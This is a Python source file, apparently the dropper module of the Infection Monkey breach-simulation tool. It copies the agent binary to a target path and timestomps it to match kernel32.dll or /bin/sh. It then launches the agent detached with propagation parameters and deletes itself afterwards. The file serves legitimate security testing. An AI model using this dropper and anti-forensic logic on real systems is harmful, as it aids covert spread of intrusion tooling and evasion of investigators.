import argparse
import filecmp
import logging
import os
import pprint
import shutil
import subprocess
import sys
import time
from pathlib import PosixPath, WindowsPath

from monkeytypes import OperatingSystem

from common.utils.environment import get_os
from infection_monkey.utils.argparse_types import positive_int
from infection_monkey.utils.commands import (
    build_monkey_commandline_parameters,
    get_monkey_commandline_linux,
    get_monkey_commandline_windows,
)
from infection_monkey.utils.file_utils import mark_file_for_deletion_on_windows

logger = logging.getLogger(__name__)

MOVEFILE_DELAY_UNTIL_REBOOT = 4


def file_exists_at_destination(source_path, destination_path) -> bool:
    try:
        return filecmp.cmp(source_path, destination_path)
    except OSError:
        return False


def get_date_reference_path():
    if get_os() == OperatingSystem.WINDOWS:
        return os.path.expandvars(WindowsPath(r"%windir%\system32\kernel32.dll"))
    else:
        return PosixPath("/bin/sh")


class MonkeyDrops(object):
    def __init__(self, args):
        arg_parser = argparse.ArgumentParser()
        arg_parser.add_argument("-p", "--parent")
        arg_parser.add_argument("-s", "--servers", type=lambda arg: arg.strip().split(","))
        arg_parser.add_argument("-d", "--depth", type=positive_int, default=0)
        arg_parser.add_argument("-l", "--location")
        arg_parser.add_argument("-vp", "--vulnerable-port")
        self.opts = arg_parser.parse_args(args)

        self._config = {
            "source_path": os.path.abspath(sys.argv[0]),
            "destination_path": self.opts.location,
        }

        logger.debug("Dropper is running with config:\n%s", pprint.pformat(self._config))

    def start(self):
        if self._config["destination_path"] is None:
            logger.error("No destination path specified")
            return False

        source_path = self._config["source_path"]
        destination_path = self._config["destination_path"]

        # we copy/move only in case path is different
        file_exists = file_exists_at_destination(source_path, destination_path)
        if not file_exists and os.path.exists(destination_path):
            os.remove(destination_path)

        if (
            not file_exists
            and not self._move_file(source_path, destination_path)
            and not self._copy_file(source_path, destination_path)
        ):
            return False

        MonkeyDrops._try_update_access_time(destination_path)
        monkey_process = self._run_monkey(destination_path)

        time.sleep(3)
        if monkey_process.poll() is not None:
            logger.warning("Seems like monkey died too soon")

    def _move_file(self, source_path, destination_path) -> bool:
        try:
            shutil.move(source_path, destination_path)
            logger.info(f"Moved source file '{source_path}' into '{destination_path}'")
        except (IOError, OSError) as exc:
            logger.debug(
                f"Error moving source file '{source_path}' into '{destination_path}': {exc}"
            )

            return False

        return True

    def _copy_file(self, source_path, destination_path) -> bool:
        try:
            shutil.copy(source_path, destination_path)
            logger.info(f"Copied source file '{source_path}' into '{destination_path}'")
        except (IOError, OSError) as exc:
            logger.debug(
                f"Error copying source file '{source_path}' into '{destination_path}': {exc}"
            )

            return False

        return True

    @staticmethod
    def _try_update_access_time(destination_path):
        dropper_date_reference_path = get_date_reference_path()

        try:
            ref_stat = os.stat(dropper_date_reference_path)
        except OSError:
            logger.warning(
                f"Cannot set reference date using '{dropper_date_reference_path}', file not found"
            )
        else:
            try:
                os.utime(destination_path, (ref_stat.st_atime, ref_stat.st_mtime))
            except OSError:
                logger.warning("Cannot set reference date to destination file")

    def _run_monkey(self, destination_path) -> subprocess.Popen:
        monkey_options = build_monkey_commandline_parameters(
            parent=self.opts.parent,
            servers=self.opts.servers,
            depth=self.opts.depth,
            location=None,
        )

        if get_os() == OperatingSystem.WINDOWS:
            from win32process import DETACHED_PROCESS

            monkey_commandline = get_monkey_commandline_windows(destination_path, monkey_options)

            monkey_process = subprocess.Popen(
                monkey_commandline,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                close_fds=True,
                creationflags=DETACHED_PROCESS,
            )
        else:
            # In Linux, we need to change the directory first, which is done
            # using thw `cwd` argument in `subprocess.Popen` below

            monkey_commandline = get_monkey_commandline_linux(destination_path, monkey_options)

            monkey_process = subprocess.Popen(
                monkey_commandline,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                close_fds=True,
                cwd="/".join(destination_path.split("/")[0:-1]),
            )

        logger.info(
            f"Executed monkey process (PID={monkey_process.pid}) "
            f"with command line: {' '.join(monkey_commandline)}"
        )
        return monkey_process

    def cleanup(self):
        logger.info("Cleaning up the dropper")

        source_path = self._config["source_path"]

        try:
            if source_path.lower() != self._config["destination_path"].lower() and os.path.exists(
                source_path
            ):
                self._remove_file(source_path)
            logger.info("Dropper cleanup complete")
        except AttributeError:
            logger.error("Invalid configuration options. Failing")

    def _remove_file(self, path):
        try:
            os.remove(path)
        except Exception as exc:
            logger.debug(f"Error removing source file '{path}': {exc}")

            # mark the file for removal on next boot
            mark_file_for_deletion_on_windows(WindowsPath(path))
